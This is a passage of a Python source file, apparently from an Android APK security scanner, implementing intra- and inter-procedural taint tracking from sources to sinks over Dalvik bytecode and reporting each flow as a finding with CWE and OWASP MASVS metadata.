# StringBuilder / String / Uri builder helper methods that propagate taint
# through their argument(s) into the return value or the receiver.
TAINT_PROPAGATORS = {
    ("Ljava/lang/StringBuilder;", "append"),
    ("Ljava/lang/StringBuffer;", "append"),
    ("Ljava/lang/String;", "concat"),
    ("Ljava/lang/String;", "format"),
    ("Ljava/lang/String;", "valueOf"),
    ("Ljava/lang/String;", "trim"),
    ("Ljava/lang/String;", "substring"),
    ("Ljava/lang/String;", "replace"),
    ("Ljava/lang/String;", "replaceAll"),
    ("Ljava/lang/String;", "toLowerCase"),
    ("Ljava/lang/String;", "toUpperCase"),
    ("Landroid/net/Uri$Builder;", "appendPath"),
    ("Landroid/net/Uri$Builder;", "appendQueryParameter"),
    ("Landroid/net/Uri$Builder;", "build"),
    ("Landroid/net/Uri;", "parse"),
    # Builder result-aliases (already covered by being propagators -- the
    # tracer also marks the receiver as tainted on invoke-virtual).
    ("Ljava/lang/StringBuilder;", "toString"),
    ("Ljava/lang/StringBuffer;", "toString"),
    ("Ljava/lang/StringBuilder;", "<init>"),
    # JSON / data builders
    ("Lorg/json/JSONObject;", "put"),
    ("Lorg/json/JSONArray;", "put"),
    ("Lcom/google/gson/Gson;", "toJson"),
}


# Collection-style aliasing: methods that "store" a value into a container
# (ANY get on the same container reads back potentially-tainted data) and
# methods that "retrieve" from it.
#
# Format: class_descriptor -> ("store_methods", "retrieve_methods")
# When we see a store with a tainted value, we mark the receiver register
# as having "tainted contents" -- a special provenance prefix "container:".
# When we see a retrieve from a "container:"-marked receiver, the result is tainted.
TAINT_COLLECTION_STORES = {
    "Ljava/util/List;":          ("add", "set"),
    "Ljava/util/ArrayList;":     ("add", "set"),
    "Ljava/util/LinkedList;":    ("add", "set"),
    "Ljava/util/Collection;":    ("add",),
    "Ljava/util/Set;":           ("add",),
    "Ljava/util/HashSet;":       ("add",),
    "Ljava/util/Map;":           ("put",),
    "Ljava/util/HashMap;":       ("put",),
    "Ljava/util/concurrent/ConcurrentHashMap;": ("put",),
    "Landroid/util/SparseArray;":               ("put", "append"),
    "Landroid/os/Bundle;":       ("putString", "putInt", "putParcelable", "putBundle"),
}
TAINT_COLLECTION_RETRIEVES = {
    "Ljava/util/List;":          ("get", "iterator", "toArray"),
    "Ljava/util/ArrayList;":     ("get", "iterator", "toArray"),
    "Ljava/util/LinkedList;":    ("get", "iterator", "toArray"),
    "Ljava/util/Collection;":    ("iterator", "toArray"),
    "Ljava/util/Set;":           ("iterator", "toArray"),
    "Ljava/util/HashSet;":       ("iterator", "toArray"),
    "Ljava/util/Map;":           ("get", "values", "keySet", "entrySet"),
    "Ljava/util/HashMap;":       ("get", "values", "keySet", "entrySet"),
    "Ljava/util/concurrent/ConcurrentHashMap;": ("get", "values"),
    "Landroid/util/SparseArray;":               ("get", "valueAt"),
    "Landroid/os/Bundle;":       ("getString", "getInt", "getParcelable", "getBundle", "get"),
}


def _is_collection_store(class_name: str, method_name: str) -> bool:
    """Is (class, method) a store operation on a collection?"""
    methods = TAINT_COLLECTION_STORES.get(class_name, ())
    return method_name in methods


def _is_collection_retrieve(class_name: str, method_name: str) -> bool:
    """Is (class, method) a retrieve operation on a collection?"""
    methods = TAINT_COLLECTION_RETRIEVES.get(class_name, ())
    return method_name in methods


def _is_taint_source(class_name: str, method_name: str):
    """Return source-kind label if (class, method) is a known taint source."""
    return TAINT_SOURCES.get((class_name, method_name))


def _is_taint_sink(class_name: str, method_name: str):
    """Return sink metadata dict if (class, method) is a known taint sink."""
    return TAINT_SINKS.get((class_name, method_name))


def _is_taint_propagator(class_name: str, method_name: str):
    """Whether (class, method) propagates taint from its arguments to its return."""
    return (class_name, method_name) in TAINT_PROPAGATORS


def _parse_invoke(ins):
    """Extract (class_name, method_name, register_list) from an invoke instruction.
    Returns (None, None, []) if the instruction isn't an invoke or can't be parsed."""
    op = ins.get_name()
    if not op.startswith("invoke-"):
        return None, None, []
    try:
        operands = ins.get_operands()
        # Last operand is the method reference; earlier are register indices
        method_ref = None
        regs = []
        for opnd in operands:
            if isinstance(opnd, tuple) and len(opnd) >= 2:
                kind = opnd[0]
                # kind 0 = register, kind 4 = method ref (varies by androguard ver)
                # Use string-form fallback
                val = opnd[-1]
                if isinstance(val, str) and "->" in val:
                    method_ref = val
                else:
                    regs.append(opnd[-1])
            elif isinstance(opnd, int):
                regs.append(opnd)
            elif isinstance(opnd, str) and "->" in opnd:
                method_ref = opnd
        if method_ref:
            # method_ref looks like "Lpkg/Class;->method(args)return"
            cls, rest = method_ref.split("->", 1)
            mname = rest.split("(", 1)[0]
            return cls, mname, regs
    except Exception:
        pass
    return None, None, []


def _trace_method_taint(method, source_callback=None) -> list:
    """Walk a method's bytecode, track tainted registers, return list of
    (sink_meta, source_kind, evidence_str) tuples for each source-to-sink flow.

    Implementation:
      - Scan instructions in order
      - On invoke of a SOURCE method: mark the destination register (next
        move-result-* instruction's target) as tainted, with source kind
      - On invoke of a PROPAGATOR with at least one tainted argument: mark
        the destination register as tainted (carrying the original source)
      - On invoke of a SINK with at least one tainted argument: record the flow
      - Reset taint when a register is overwritten by a non-propagating op
    """
    flows = []
    try:
        # androguard EncodedMethod.get_instructions() yields each instruction in order
        ins_list = list(method.get_instructions())
    except Exception:
        return flows

    # tainted_regs: register_index -> source_kind
    tainted = {}
    # pending_taint: when an invoke-* hits a source/propagator, the next
    # move-result-* writes the return value to a register; mark that register tainted.
    pending = None  # None or source_kind

    method_descriptor = ""
    try:
        method_descriptor = f"{method.get_class_name()}->{method.get_name()}"
    except Exception:
        pass

    for ins in ins_list:
        try:
            op_name = ins.get_name()
        except Exception:
            continue

        # First handle pending taint from prior invoke -> consumed by move-result-*
        if pending is not None and op_name.startswith("move-result"):
            try:
                operands = ins.get_operands()
                if operands:
                    dest = operands[0]
                    if isinstance(dest, tuple): dest = dest[-1]
                    if isinstance(dest, int):
                        tainted[dest] = pending
            except Exception:
                pass
            pending = None
            continue
        if pending is not None:
            # Some non-result-consuming op intervened; drop pending
            pending = None

        # Handle invokes
        if op_name.startswith("invoke-"):
            cls, mname, regs = _parse_invoke(ins)
            if cls is None:
                continue

            # Is it a SOURCE?
            src_kind = _is_taint_source(cls, mname)
            if src_kind:
                pending = src_kind
                continue

            # Is it a SINK with any tainted argument?
            sink_meta = _is_taint_sink(cls, mname)
            if sink_meta:
                tainted_args = [r for r in regs if r in tainted]
                if tainted_args:
                    # Pick the first tainted argument's source-kind for evidence
                    src = tainted[tainted_args[0]]
                    evidence = (f"In {method_descriptor}: tainted data from "
                                f"{src} flows into {cls}->{mname} "
                                f"(register v{tainted_args[0]})")
                    flows.append((sink_meta, src, evidence))
                continue

            # Is it a PROPAGATOR with at least one tainted argument?
            if _is_taint_propagator(cls, mname):
                if any(r in tainted for r in regs):
                    # Find the source kind from the first tainted arg
                    for r in regs:
                        if r in tainted:
                            pending = tainted[r]
                            break
                    # Also: for instance methods like StringBuilder.append, the
                    # receiver (regs[0]) is itself "becoming" tainted
                    if regs and op_name.startswith("invoke-virtual"):
                        tainted[regs[0]] = pending or "propagated"
                continue

            # Is it a COLLECTION STORE (list.add, map.put, bundle.putString, ...)?
            # If a tainted argument is being stored, mark the receiver register
            # as a "tainted container" so subsequent retrieves alias the taint.
            if _is_collection_store(cls, mname):
                # invoke-virtual {v_recv, v_arg1, ...} -- regs[0] is receiver
                if len(regs) >= 2 and any(r in tainted for r in regs[1:]):
                    src_prov = next((tainted[r] for r in regs[1:] if r in tainted), "container")
                    tainted[regs[0]] = f"container:{src_prov}"
                continue

            # Is it a COLLECTION RETRIEVE (list.get, map.get, bundle.getString)?
            # If receiver is a tainted container, mark next move-result as tainted.
            if _is_collection_retrieve(cls, mname):
                if regs and regs[0] in tainted:
                    prov = tainted[regs[0]]
                    if prov.startswith("container:"):
                        # Carry the inner provenance forward
                        pending = prov[len("container:"):]
                continue

            # Unknown method call: doesn't taint anything, doesn't clear anything
            continue

        # Handle move (register-to-register): propagate taint
        if op_name.startswith("move") and not op_name.startswith("move-result"):
            try:
                operands = ins.get_operands()
                if len(operands) >= 2:
                    dest = operands[0]
                    src = operands[1]
                    if isinstance(dest, tuple): dest = dest[-1]
                    if isinstance(src, tuple): src = src[-1]
                    if isinstance(dest, int) and isinstance(src, int):
                        if src in tainted:
                            tainted[dest] = tainted[src]
                        else:
                            tainted.pop(dest, None)
            except Exception:
                pass
            continue

        # Handle const-* (literal load): clears taint on dest register
        if op_name.startswith("const"):
            try:
                operands = ins.get_operands()
                if operands:
                    dest = operands[0]
                    if isinstance(dest, tuple): dest = dest[-1]
                    if isinstance(dest, int):
                        tainted.pop(dest, None)
            except Exception:
                pass
            continue

        # Other ops: leave taint state unchanged

    return flows


def analyze_taint(ctx: Ctx) -> list:
    """Run intra-procedural taint analysis across every method in the APK.
    Each detected source-to-sink flow becomes one Finding with confidence=confirmed.
    """
    findings = []
    if not ctx.dx:
        return findings

    # Track unique flow signatures so we don't emit dozens of dupes per method
    seen_signatures = set()

    method_count = 0
    flow_count = 0

    try:
        # androguard 3.4 + 4.x: dx.get_methods() iterates MethodAnalysis objects
        # Each has get_method() -> EncodedMethod
        methods = list(ctx.dx.get_methods())
    except Exception:
        # Fallback: try get_classes() and walk methods
        methods = []
        try:
            for cls in ctx.dx.get_classes():
                try:
                    methods.extend(cls.get_methods())
                except Exception:
                    continue
        except Exception:
            return findings

    for ma in methods:
        try:
            m = ma.get_method() if hasattr(ma, "get_method") else ma
            if m is None:
                continue
            # Skip methods with no code (abstract / native)
            try:
                code = m.get_code()
                if code is None:
                    continue
            except Exception:
                continue
            method_count += 1
            flows = _trace_method_taint(m)
            for sink_meta, src_kind, evidence in flows:
                # Deduplicate by (sink id, source kind, method name)
                try:
                    method_id = f"{m.get_class_name()}->{m.get_name()}"
                except Exception:
                    method_id = "?"
                sig = (sink_meta["id"], src_kind, method_id)
                if sig in seen_signatures:
                    continue
                seen_signatures.add(sig)
                flow_count += 1

                findings.append(Finding(
                    id=f"{sink_meta['id']}-{abs(hash(method_id)) % 100000}",
                    title=sink_meta["title"],
                    severity=sink_meta["severity"],
                    category=sink_meta["category"],
                    description=sink_meta["description"],
                    evidence=evidence[:480],
                    recommendation=sink_meta["fix"],
                    cwe=sink_meta["cwe"],
                    cvss=sink_meta["cvss"],
                    masvs=sink_meta["masvs"],
                    fix=sink_meta["fix"],
                    impact=("Source-to-sink data flow was directly observed. "
                            "An attacker controlling the source (Intent extra, URI "
                            "parameter, etc.) can affect the sink's behaviour."),
                    references=[
                        f"https://cwe.mitre.org/data/definitions/{sink_meta['cwe'].split('-')[1]}.html",
                        "https://mas.owasp.org/MASTG/",
                    ],
                    confidence="confirmed",
                    source="vexa-taint",
                ))
        except Exception as e:
            # Don't let one broken method kill the whole pass
            log.debug("taint-trace failed for one method: %s", e)
            continue

    log.info("Taint analysis: scanned %d methods, %d flows detected",
             method_count, flow_count)
    return findings


# =============================================================================
# Inter-procedural taint analysis (v1.5).
#
# The intra-procedural pass above misses bugs where the source and sink are in
# DIFFERENT user methods, connected by a method call:
#
#     void onCreate() {
#         String x = getIntent().getStringExtra("q");   // SOURCE here
#         queryDb(x);                                    // calls helper
#     }
#     void queryDb(String input) {
#         db.rawQuery(input, null);                      // SINK here
#     }
#
# Approach: build a "method summary" for every user method, capturing:
#   1) which parameters, if tainted, propagate to the return value
#   2) which parameters, if tainted, reach an internal sink (and which sink)
#
# Then a second pass uses these summaries when crossing method-call boundaries:
# if `methodA` calls `methodB(tainted_arg)` and `methodB`'s summary says param 0
# reaches an SQL sink, we report a flow from A's source to B's sink.
#
# Compromises explicitly accepted in v1:
#  - Virtual dispatch is over-approximated by taking the union of summaries for
#    methods sharing the same name + class hierarchy match (small chance of FPs)
#  - Recursive calls bound to N=4 fixpoint iterations
#  - Field-based propagation still NOT tracked (handles via setters/getters miss)
#  - Framework methods (java.*, android.*) use only the hand-curated source/sink
#    tables -- we don't compute summaries for them
#
# Findings emitted by this layer get confidence=likely (vs confirmed for purely
# intra-procedural) so reviewers can filter if they want only direct flows.
# =============================================================================

@dataclass
class MethodSummary:
    """Captures inter-procedural taint behaviour of one method.

    Fields:
        return_taints_from_params: parameter indices that, when tainted,
            cause the return value of this method to be tainted.
            For instance methods, parameter 0 is the receiver (this).
        param_reaches_sink: parameter index -> sink metadata dict.
            If parameter N is tainted, it flows into the named sink.
        fields_written_tainted: set of field descriptors (e.g. "Lcom/x/Foo;->userInput:Ljava/lang/String;")
            this method writes a tainted value into. Used by callers that read
            the same field to know taint persists across method boundaries.
        fields_read_to_sink: dict[field_descriptor -> sink_meta]. If this method
            reads a tainted value from a field and that value reaches a sink, we
            record which field. Callers/runners that previously tainted that
            field can be flagged inter-procedurally.
        unknown: True if we couldn't analyze (no code, error during walk).
    """
    return_taints_from_params: set         # set[int]
    param_reaches_sink: dict               # int -> sink_meta
    fields_written_tainted: set = field(default_factory=set)  # set[str]
    fields_read_to_sink: dict = field(default_factory=dict)   # str -> sink_meta
    unknown: bool = False


def _is_user_class(class_name: str) -> bool:
    """Return True if class_name appears to be user code (not Android / Java framework).
    We only build summaries for user code; framework methods use the hand-curated
    source / sink / propagator tables."""
    if not class_name:
        return False
    # androguard class names look like "Lcom/foo/Bar;"
    cn = class_name.lstrip("L").rstrip(";").replace("/", ".")
    framework_prefixes = (
        "android.", "androidx.", "java.", "javax.", "kotlin.", "kotlinx.",
        "dalvik.", "org.apache.", "org.json", "com.google.android.",
        "com.android.", "com.facebook.react.",
    )
    return not any(cn.startswith(p) for p in framework_prefixes)


def _method_param_count(method) -> int:
    """Best-effort count of method parameters (including 'this' for instance methods).
    Returns 0 if it can't be determined."""
    try:
        # androguard EncodedMethod has access_flags + descriptor like
        # (Ljava/lang/String;I)V -> 2 params
        desc = method.get_descriptor() if hasattr(method, "get_descriptor") else ""
        if not desc:
            return 0
        # Parse the descriptor between '(' and ')'
        if "(" not in desc or ")" not in desc:
            return 0
        param_str = desc[desc.index("(") + 1:desc.index(")")]
        # Count primitive (single-char) and object (L...;) and array ([...) types
        count = 0
        i = 0
        while i < len(param_str):
            c = param_str[i]
            if c == "L":
                # Object reference: L...;
                semi = param_str.find(";", i)
                if semi == -1: break
                count += 1
                i = semi + 1
            elif c == "[":
                # Array: skip [...
                count += 1
                while i < len(param_str) and param_str[i] == "[":
                    i += 1
                if i < len(param_str) and param_str[i] == "L":
                    semi = param_str.find(";", i)
                    if semi == -1: break
                    i = semi + 1
                else:
                    i += 1  # primitive array element
            elif c in "ZBSCIJFD":  # primitives
                count += 1
                i += 1
            else:
                i += 1  # unknown -- skip
        # Add 1 for 'this' if instance method
        try:
            access = method.get_access_flags()
            ACC_STATIC = 0x8
            if not (access & ACC_STATIC):
                count += 1
        except Exception:
            count += 1  # assume instance
        return count
    except Exception:
        return 0


def _method_param_register_map(method) -> dict:
    """Compute the mapping from REGISTER NUMBER to PARAMETER POSITION (0-indexed).

    In Dalvik bytecode, parameters arrive in the highest-numbered registers:
        param_register = registers_size - param_count + position

    Where param_count = (1 if instance method else 0) + len(descriptor params)
    and registers_size is the method's total register count.

    Returns dict[register_number -> param_position]. Empty dict on failure.
    """
    try:
        code = method.get_code()
        if code is None:
            return {}
        regs_size = code.get_registers_size() if hasattr(code, "get_registers_size") else 0
        if not regs_size:
            return {}

        # Count params from descriptor
        desc = method.get_descriptor() if hasattr(method, "get_descriptor") else ""
        if not desc or "(" not in desc or ")" not in desc:
            return {}
        param_str = desc[desc.index("(") + 1:desc.index(")")]
        n_descriptor_params = 0
        i = 0
        while i < len(param_str):
            c = param_str[i]
            if c == "L":
                semi = param_str.find(";", i)
                if semi == -1: break
                n_descriptor_params += 1
                i = semi + 1
            elif c == "[":
                n_descriptor_params += 1
                while i < len(param_str) and param_str[i] == "[":
                    i += 1
                if i < len(param_str) and param_str[i] == "L":
                    semi = param_str.find(";", i)
                    if semi == -1: break
                    i = semi + 1
                else:
                    i += 1
            elif c in "ZBSCIJFD":
                n_descriptor_params += 1
                i += 1
            else:
                i += 1

        # Add 1 for 'this' if instance method
        is_static = False
        try:
            access = method.get_access_flags()
            is_static = bool(access & 0x8)  # ACC_STATIC
        except Exception:
            pass
        total_params = n_descriptor_params + (0 if is_static else 1)
        if total_params == 0:
            return {}

        # Parameters are at the top of the register file
        first_param_reg = regs_size - total_params
        return {first_param_reg + i: i for i in range(total_params)}
    except Exception:
        return {}


def _build_method_summary(method, summaries: dict) -> MethodSummary:
    """Walk a method's instructions tracking which PARAMETERS reach sinks or
    propagate to the return value. Uses `summaries` for inter-procedural lookups
    (call sites whose target already has a known summary).

    Implementation note: in Dalvik bytecode, parameters arrive in the highest
    register slots. For method M with N parameters and L locals, parameters are
    in registers v(L), v(L+1), ..., v(L+N-1). We don't know L exactly without
    parsing the method's locals count, so we conservatively mark ALL incoming
    registers as parameter-tainted at method entry and observe how taint flows
    from there.

    The simpler approach we use: mark each parameter as a synthetic source by
    pre-populating the taint map with `param-N` labels. Walk the method's
    instructions; when a tainted param register reaches a sink, record it.
    """
    summary = MethodSummary(return_taints_from_params=set(), param_reaches_sink={})

    try:
        ins_list = list(method.get_instructions())
    except Exception:
        summary.unknown = True
        return summary

    # Precise parameter-register mapping (when registers_size is available)
    reg_to_param_idx = _method_param_register_map(method)
    # Fallback heuristic: when we can't compute it, use the first-read-before-written
    # technique with REGISTER NUMBER as a stand-in for parameter index. This is
    # imprecise but better than nothing for synthetic / mock methods.
    use_precise = bool(reg_to_param_idx)

    written_regs = set()
    tainted = {}
    pending_taint = None
    pending_param_idx = None

    # If we have a precise param map, pre-mark each parameter register as
    # tainted with its true parameter index. This is the cleanest path.
    if use_precise:
        for reg, pidx in reg_to_param_idx.items():
            tainted[reg] = f"param:{pidx}"
            # Don't add to written_regs -- parameters are inputs, not local writes

    for ins in ins_list:
        try:
            op_name = ins.get_name()
        except Exception:
            continue

        # FIRST: scan all operands and mark any register that's read-before-written
        # as a parameter (best-effort heuristic). This is ONLY needed when we
        # couldn't compute the precise reg_to_param_idx map -- typically only
        # synthetic / mock methods or methods without a registers_size attribute.
        if not use_precise:
            try:
                operands_for_param_scan = ins.get_operands()
                for opnd in operands_for_param_scan:
                    val = opnd[-1] if isinstance(opnd, tuple) else opnd
                    if isinstance(val, int) and val not in written_regs:
                        if val not in tainted:
                            tainted[val] = f"param:{val}"
            except Exception:
                pass

        # Consume any pending taint from the previous invoke
        if pending_taint is not None and op_name.startswith("move-result"):
            try:
                operands = ins.get_operands()
                if operands:
                    dest = operands[0]
                    if isinstance(dest, tuple): dest = dest[-1]
                    if isinstance(dest, int):
                        tainted[dest] = pending_taint
                        written_regs.add(dest)
            except Exception:
                pass
            pending_taint = None
            pending_param_idx = None
            continue
        if pending_taint is not None:
            pending_taint = None
            pending_param_idx = None

        # Handle invokes
        if op_name.startswith("invoke-"):
            cls, mname, regs = _parse_invoke(ins)
            if cls is None:
                continue

            # SOURCE: a known framework source
            src_kind = _is_taint_source(cls, mname)
            if src_kind:
                pending_taint = f"src:{src_kind}"
                continue

            # SINK: framework sink with any tainted argument
            sink_meta = _is_taint_sink(cls, mname)
            if sink_meta:
                for r in regs:
                    if r in tainted:
                        prov = tainted[r]
                        if prov.startswith("param:"):
                            pidx = int(prov.split(":")[1])
                            if pidx not in summary.param_reaches_sink:
                                summary.param_reaches_sink[pidx] = sink_meta
                        elif prov.startswith("field:"):
                            # A tainted field read that reaches a sink: record the
                            # field so callers can detect the cross-method flow
                            # (different method writes the field with tainted data).
                            field_ref = prov[len("field:"):]
                            if field_ref not in summary.fields_read_to_sink:
                                summary.fields_read_to_sink[field_ref] = sink_meta
                continue

            # PROPAGATOR: framework propagator (string builder, etc.)
            if _is_taint_propagator(cls, mname):
                if any(r in tainted for r in regs):
                    # Propagate the strongest taint provenance
                    prov = next((tainted[r] for r in regs if r in tainted), "propagated")
                    pending_taint = prov
                    if regs and op_name.startswith("invoke-virtual"):
                        tainted[regs[0]] = prov
                continue

            # COLLECTION STORE inside summary builder
            if _is_collection_store(cls, mname):
                if len(regs) >= 2 and any(r in tainted for r in regs[1:]):
                    src_prov = next((tainted[r] for r in regs[1:] if r in tainted), "container")
                    tainted[regs[0]] = f"container:{src_prov}"
                continue

            # COLLECTION RETRIEVE inside summary builder
            if _is_collection_retrieve(cls, mname):
                if regs and regs[0] in tainted:
                    prov = tainted[regs[0]]
                    if prov.startswith("container:"):
                        pending_taint = prov[len("container:"):]
                continue

            # USER METHOD: look up its summary, apply it
            if _is_user_class(cls):
                callee_key = (cls, mname)
                callee = summaries.get(callee_key)
                if callee and not callee.unknown:
                    # Map argument registers to parameter indices.
                    # In Dalvik, invoke-virtual {v_recv, v0, v1, ...} -- regs in order.
                    # For static methods: invoke-static {v0, v1, ...} -- regs are params 0..N-1
                    # For instance methods, regs[0] is 'this' (param 0 in our numbering).
                    # We use the regs list directly: arg_index_i = i for parameter index i.
                    # If arg at position P is tainted AND P is in callee's param_reaches_sink,
                    # this is an inter-procedural sink hit. But we record it ONLY in the
                    # CALLER'S summary as "this param leads to a sink" -- because if the
                    # tainted reg in the caller IS itself a parameter of the caller, we want
                    # the chain captured.
                    for arg_pos, arg_reg in enumerate(regs):
                        if arg_reg in tainted:
                            prov = tainted[arg_reg]
                            # Inter-procedural sink: caller passes tainted data into a callee
                            # parameter that internally reaches a sink.
                            if arg_pos in callee.param_reaches_sink:
                                if prov.startswith("param:"):
                                    caller_pidx = int(prov.split(":")[1])
                                    if caller_pidx not in summary.param_reaches_sink:
                                        # Mark the chain: caller's param reaches sink via callee
                                        m = dict(callee.param_reaches_sink[arg_pos])
                                        m["_inter_procedural"] = True
                                        summary.param_reaches_sink[caller_pidx] = m
                            # Inter-procedural return-taint: if caller's tainted arg sits at
                            # a position that propagates to the callee's return, then
                            # callee's return is tainted with the same provenance.
                            if arg_pos in callee.return_taints_from_params:
                                pending_taint = prov  # carry the same provenance
                continue

            # Unknown method -- conservatively, NO propagation
            continue

        # move (register-to-register): copy taint
        if op_name.startswith("move") and not op_name.startswith("move-result"):
            try:
                operands = ins.get_operands()
                if len(operands) >= 2:
                    dest = operands[0]
                    src = operands[1]
                    if isinstance(dest, tuple): dest = dest[-1]
                    if isinstance(src, tuple): src = src[-1]
                    if isinstance(dest, int) and isinstance(src, int):
                        if src in tainted:
                            tainted[dest] = tainted[src]
                        else:
                            tainted.pop(dest, None)
                        written_regs.add(dest)
            except Exception:
                pass
            continue

        # const-*: clears taint, marks register as written
        if op_name.startswith("const"):
            try:
                operands = ins.get_operands()
                if operands:
                    dest = operands[0]
                    if isinstance(dest, tuple): dest = dest[-1]
                    if isinstance(dest, int):
                        tainted.pop(dest, None)
                        written_regs.add(dest)
            except Exception:
                pass
            continue

        # iput-*  / sput-*  : write a register's value into an instance / static field.
        # If the source register is tainted, record the field in fields_written_tainted.
        # Operand layout: iput v(src), v(this), Lpkg/Class;->fieldName:Type
        #                 sput v(src), Lpkg/Class;->fieldName:Type
        if op_name.startswith("iput") or op_name.startswith("sput"):
            try:
                operands = ins.get_operands()
                # Find the source register and the field reference
                src_reg = None
                field_ref = None
                for opnd in operands:
                    val = opnd[-1] if isinstance(opnd, tuple) else opnd
                    if isinstance(val, str) and "->" in val and ":" in val:
                        field_ref = val
                    elif isinstance(val, int) and src_reg is None:
                        src_reg = val
                if src_reg is not None and field_ref:
                    if src_reg in tainted:
                        summary.fields_written_tainted.add(field_ref)
            except Exception:
                pass
            continue

        # iget-* / sget-* : read a field into a register. Mark the dest register
        # as tainted with provenance "field:<descriptor>" so we can detect
        # field -> sink flows in the same method.
        # Operand layout: iget v(dest), v(this), Lpkg/Class;->fieldName:Type
        #                 sget v(dest), Lpkg/Class;->fieldName:Type
        if op_name.startswith("iget") or op_name.startswith("sget"):
            try:
                operands = ins.get_operands()
                dest_reg = None
                field_ref = None
                for opnd in operands:
                    val = opnd[-1] if isinstance(opnd, tuple) else opnd
                    if isinstance(val, str) and "->" in val and ":" in val:
                        field_ref = val
                    elif isinstance(val, int) and dest_reg is None:
                        dest_reg = val
                if dest_reg is not None and field_ref:
                    # Mark this register as field-tainted; if it later reaches a sink,
                    # we record the field in fields_read_to_sink.
                    tainted[dest_reg] = f"field:{field_ref}"
                    written_regs.add(dest_reg)
            except Exception:
                pass
            continue

        # return / return-object: did we return a tainted value?
        if op_name.startswith("return"):
            if op_name == "return-void":
                continue
            try:
                operands = ins.get_operands()
                if operands:
                    src = operands[0]
                    if isinstance(src, tuple): src = src[-1]
                    if isinstance(src, int) and src in tainted:
                        prov = tainted[src]
                        if prov.startswith("param:"):
                            pidx = int(prov.split(":")[1])
                            summary.return_taints_from_params.add(pidx)
            except Exception:
                pass
            continue

    return summary


def _compute_summaries(methods, max_iterations: int = 4) -> dict:
    """Build method summaries via fixpoint iteration.

    Iterates `max_iterations` times. Each iteration recomputes every method's
    summary using the previous iteration's summaries for callees. For non-recursive
    code, 1-2 iterations suffice; for recursive / mutually-recursive methods,
    we cap at max_iterations and accept the over-approximation.

    Returns dict[(class_name, method_name) -> MethodSummary].
    """
    summaries = {}
    method_keys = []  # (key, method) tuples

    for ma in methods:
        try:
            m = ma.get_method() if hasattr(ma, "get_method") else ma
            if m is None or not hasattr(m, "get_class_name"):
                continue
            cls = m.get_class_name()
            if not _is_user_class(cls):
                continue
            try:
                code = m.get_code()
                if code is None:
                    continue
            except Exception:
                continue
            key = (cls, m.get_name())
            method_keys.append((key, m))
            # Initialize with empty summary
            summaries[key] = MethodSummary(set(), {})
        except Exception:
            continue

    if not method_keys:
        return summaries

    log.info("Taint summaries: %d user methods to analyze", len(method_keys))

    for iteration in range(max_iterations):
        changed = 0
        for key, m in method_keys:
            try:
                old = summaries.get(key)
                new = _build_method_summary(m, summaries)
                # Always store the new summary (it may have field-tracking data
                # even when param-tracking didn't change). The `changed` counter
                # only controls fixpoint termination, not storage.
                summaries[key] = new
                if (old is None or
                        old.return_taints_from_params != new.return_taints_from_params or
                        set(old.param_reaches_sink.keys()) != set(new.param_reaches_sink.keys()) or
                        old.fields_written_tainted != new.fields_written_tainted or
                        set(old.fields_read_to_sink.keys()) != set(new.fields_read_to_sink.keys())):
                    changed += 1
            except Exception as e:
                log.debug("Summary build failed for %s: %s", key, e)
                continue
        log.info("  Iteration %d: %d summaries changed", iteration + 1, changed)
        if changed == 0:
            break

    return summaries


def _trace_method_taint_with_summaries(method, summaries: dict) -> list:
    """Final-pass tracer: walk method instructions tracking taint, and at each
    call site use the callee's summary to propagate taint inter-procedurally.

    Returns list of (sink_meta, source_kind, evidence_str, is_inter_procedural).
    """
    flows = []
    try:
        ins_list = list(method.get_instructions())
    except Exception:
        return flows

    method_descriptor = ""
    try:
        method_descriptor = f"{method.get_class_name()}->{method.get_name()}"
    except Exception:
        pass

    tainted = {}        # reg -> source_kind label
    pending_taint = None

    for ins in ins_list:
        try:
            op_name = ins.get_name()
        except Exception:
            continue

        # Pending taint consumed by move-result-*
        if pending_taint is not None and op_name.startswith("move-result"):
            try:
                operands = ins.get_operands()
                if operands:
                    dest = operands[0]
                    if isinstance(dest, tuple): dest = dest[-1]
                    if isinstance(dest, int):
                        tainted[dest] = pending_taint
            except Exception:
                pass
            pending_taint = None
            continue
        if pending_taint is not None:
            pending_taint = None

        # Invokes
        if op_name.startswith("invoke-"):
            cls, mname, regs = _parse_invoke(ins)
            if cls is None:
                continue

            # SOURCE
            src_kind = _is_taint_source(cls, mname)
            if src_kind:
                pending_taint = src_kind
                continue

            # SINK
            sink_meta = _is_taint_sink(cls, mname)
            if sink_meta:
                tainted_args = [r for r in regs if r in tainted]
                if tainted_args:
                    src = tainted[tainted_args[0]]
                    evidence = (f"In {method_descriptor}: tainted data from "
                                f"{src} flows into {cls}->{mname} "
                                f"(register v{tainted_args[0]})")
                    flows.append((sink_meta, src, evidence, False))
                continue

            # PROPAGATOR
            if _is_taint_propagator(cls, mname):
                if any(r in tainted for r in regs):
                    prov = next((tainted[r] for r in regs if r in tainted), "propagated")
                    pending_taint = prov
                    if regs and op_name.startswith("invoke-virtual"):
                        tainted[regs[0]] = prov
                continue

            # COLLECTION STORE: tainted arg -> mark receiver as tainted container
            if _is_collection_store(cls, mname):
                if len(regs) >= 2 and any(r in tainted for r in regs[1:]):
                    src_prov = next((tainted[r] for r in regs[1:] if r in tainted), "container")
                    tainted[regs[0]] = f"container:{src_prov}"
                continue

            # COLLECTION RETRIEVE: receiver is tainted container -> result tainted
            if _is_collection_retrieve(cls, mname):
                if regs and regs[0] in tainted:
                    prov = tainted[regs[0]]
                    if prov.startswith("container:"):
                        pending_taint = prov[len("container:"):]
                continue

            # USER METHOD: use its summary
            if _is_user_class(cls):
                callee = summaries.get((cls, mname))
                if callee and not callee.unknown:
                    # Check inter-procedural sink hits: argument N at position P,
                    # if tainted, AND callee's summary says param P reaches a sink.
                    for arg_pos, arg_reg in enumerate(regs):
                        if arg_reg in tainted and arg_pos in callee.param_reaches_sink:
                            sink_via_callee = callee.param_reaches_sink[arg_pos]
                            src = tainted[arg_reg]
                            evidence = (f"In {method_descriptor}: tainted data from "
                                        f"{src} flows into {cls}->{mname}(...) which "
                                        f"internally reaches {sink_via_callee['id']} "
                                        f"(inter-procedural)")
                            flows.append((sink_via_callee, src, evidence, True))
                    # Check return-taint propagation: if any tainted arg is at a position
                    # that propagates to return, the next move-result is tainted.
                    for arg_pos, arg_reg in enumerate(regs):
                        if arg_reg in tainted and arg_pos in callee.return_taints_from_params:
                            pending_taint = tainted[arg_reg]
                            break
                continue

            # Unknown method: no propagation
            continue

        # move
        if op_name.startswith("move") and not op_name.startswith("move-result"):
            try:
                operands = ins.get_operands()
                if len(operands) >= 2:
                    dest = operands[0]
                    src = operands[1]
                    if isinstance(dest, tuple): dest = dest[-1]
